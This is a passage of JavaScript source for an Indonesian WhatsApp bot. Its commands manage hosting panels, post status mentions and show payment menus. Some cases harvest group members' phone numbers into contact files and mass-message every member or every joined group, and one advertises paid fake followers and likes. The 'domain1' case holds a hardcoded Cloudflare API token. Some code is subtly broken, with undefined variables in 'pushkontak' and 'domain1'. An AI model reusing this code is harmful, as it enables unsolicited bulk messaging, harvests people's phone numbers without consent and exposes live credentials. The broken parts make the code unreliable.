description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return Kenz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================
case "upswtag": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await Kenz.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return Kenz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Silahkan Pilih Group\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "create-storywa": {
if (!isCreator) return Reply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await Kenz.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await Kenz.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await Kenz.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: Kenz.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await Kenz.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return m.reply(`Berhasil membuat status tag grup ${nama}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Kenz.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: Contact Kenz - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Kenz.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: Contact Kenz - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Kenz.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await Kenz.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Kenz.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Kenz.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Kenz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Kenz.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Kenz.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Kenz.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Kenz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Kenz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Kenz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Kenz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Kenz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break
//plerrr
case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break
//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Kenz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Kenz.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Kenz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Kenz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Kenz.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Kenz.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Kenz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Kenz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Kenz.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Kenz.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Kenz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: { url: global.image.dana }}, { upload: Kenz.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: { url: global.image.ovo }}, { upload: Kenz.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: { url: global.image.gopay }}, { upload: Kenz.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: {url: global.image.qris }}, { upload: Kenz.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.image.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtext2})
await Kenz.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA*

* *Nomor :* 088706060787
* *Atas Nama :* a**** t****

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Kenz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await Kenz.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*PAYMENT QRIS*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtext2})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
    if (!isCreator) return m.reply(mess.owner);
    if (!q) return m.reply("*\`</> Example :\`* proses Nama Barang");

    // Pastikan args tidak undefined
    const args = q.split(",").map(arg => arg.trim());
    if (args.length < 1) return m.reply("*\`</> Example :\`* proses nama barang");

    const [namaBarang] = args;

    // Tanggal otomatis
    const currentDate = new Date();
    const formattedDate = new Intl.DateTimeFormat('id-ID', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
    }).format(currentDate);

    // Link video (GIF)
    const videoUrl = 'https://files.catbox.moe/eos1at.mp4';

    // Format pesan
    const teks = `*🏷️ ⌜ Transaction Processing ⌟*
*📦 Barang :* ${namaBarang}
*📆 Tanggal :* ${formattedDate}
*🌀 Testimoni :*
*- whatsapp.com/channel/0029Vb0aaLc002T1H7inTg2X*

*[ ! ! ] All Trx No Reff Yaaa*`;

    // Kirim pesan dengan tampilan chat
    await Kenz.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: teks,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                 title: 'Dana Masuk ✅',
                body: 'Transaksi Anda Akan Kami Proses',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
}
break

//================================================================================

case "done": {
    if (!isCreator) return m.reply(mess.owner);
    if (!q) return m.reply("*\`</> Example :\`* done Nama Barang, Harga");

    // Pastikan args tidak undefined
    const args = q.split(",").map(arg => arg.trim());
    if (args.length < 2) return m.reply("*\`</> Example :\`* done Jasa,1000");

    const [namaBarang, harga] = args;

    // Tanggal otomatis
    const currentDate = new Date();
    const formattedDate = new Intl.DateTimeFormat('id-ID', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
    }).format(currentDate);

    // Link video (GIF)
    const videoUrl = 'https://files.catbox.moe/eos1at.mp4';

    // Format pesan
    const teks = `*🏷️ ⌜ Transaction Successful ⌟*
*📦 Barang :* ${namaBarang}
*🔖 Harga :* ${harga}
*📆 Tanggal :* ${formattedDate}
*🌀 Testimoni :*
*- whatsapp.com/channel/0029Vb0aaLc002T1H7inTg2X*

*[ ! ! ] All Trx No Reff Yaaa*`;

    // Kirim pesan dengan tampilan chat
    await Kenz.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: teks,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                 title: '🏷️⌜ Transaction Successful ⌟',
                body: 'Kenz Xpoww',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
}
break


//================================================================================

case "developerbot": case "owner": {
await Kenz.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await Kenz.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
Kenz.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./fitur.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break
//================================================================================

case 'suntiksosmed': {
reply(`*<< ᚒ List Suntik Sosmed Kenz OfficiaL ᚒ >>*

*#- Suntik Sosmed Instagram :*
- *500 Followers : Rp15.000*
- *1000 Like : Rp5.000*
- *1000 Views : Rp5.000*
> *Note Bisa request Mau brapa ! ! !*

*#- Suntik Sosmed Tiktok :*
* *500 Followers : Rp15.000*
* *1000 Followers : Rp.25.000*
* *1000 Like : Rp5.000*
* *1000 Share : Rp5.000*
* *10k Views : Rp10.000*
> *Note Bisa request Mau brapa ! ! !*

*#- Suntik Sosmed Telegram :*
* *500 Member CH : Rp5.000*
* *1000 Member CH : Rp10.000*
> *Note Bisa request Mau brapa ! ! !*

*#- Suntik Sosmed Whats'App :*
* *100 Member CH : Rp20.000*
* *500 Member CH : Rp60.000*
* *1000 Member CH : Rp115.000*
> *Note Bisa request Mau brapa ! ! !*

*#- Murid Suntik All Sosmed?*
* *Price? 10k*
*- Keuntungan?*
*- Bisa Open Suntik Sosmed*,
*- Harga Suntik Sosmed Lebih Murahh*
*- Di Jamin Balmod*`    )
}
break
//================================================================================

case 'panel': {
reply(`*#- Ready Panel Private & Public Server Masi Freshh*

*#- Panel Public 1Gb - Unli*
*#- Panel Private 1Gb - Unli*
*#- Reseller Panel 7k*
*#- Reseller Subdomain 10k*
*#- Admin Panel 10k*
*#- Partner Panel 15k*
*#- Owner Panel 20k*
*#- [ ! ] Only Bulanan, Permanen? +5k aja*
> *Nego? Bolehh*

*Ready All Produk, Produk Lainnya? Tanyakan Saja*`    )
}
break

//================================================================================

case "public": {
if (!isCreator) return
Kenz.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await Kenz.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
 const owned11 = owner + "@s.whatsapp.net"
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await Kenz.downloadAndSaveMediaMessage(qmsg)
//await Kenz.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})

await Kenz.sendMessage(idSaluran,{image: await fs.readFileSync(img), caption: text,
 contextInfo: {
 mentionedJid: [m.sender, owned11],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `Kenz Botz`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: Kenz.decodeJid(Kenz.user.id)  },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 showAdAttribution: true, 
 title: `photo dari: ${pushname}`,
 body: `message to channel from: ${m.isGroup ? `${groupMetadata.subject}` : !m.isGroup ? "chat" : "Free User"}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "backup": case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Kenz-V4-V4`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Kenz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await Kenz.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await Kenz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await Kenz.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
Kenz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================
case 'domain1':
{
 if (m.isGroup) return m.reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "699bb9eb65046a886399c91daacb1968";
 let apitoken = "fnl7ixlJ-Y-7zxJ7EUGEXitfmfLiPGW985iXobdu";
 let tld = "privatserver.my.id";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return m.reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return m.reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return m.reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 1000;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const pay = await (
 await fetch(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`)
 ).json();
 const expirationTime = new Date(pay.result.expirationTime);

 const teks3 = `
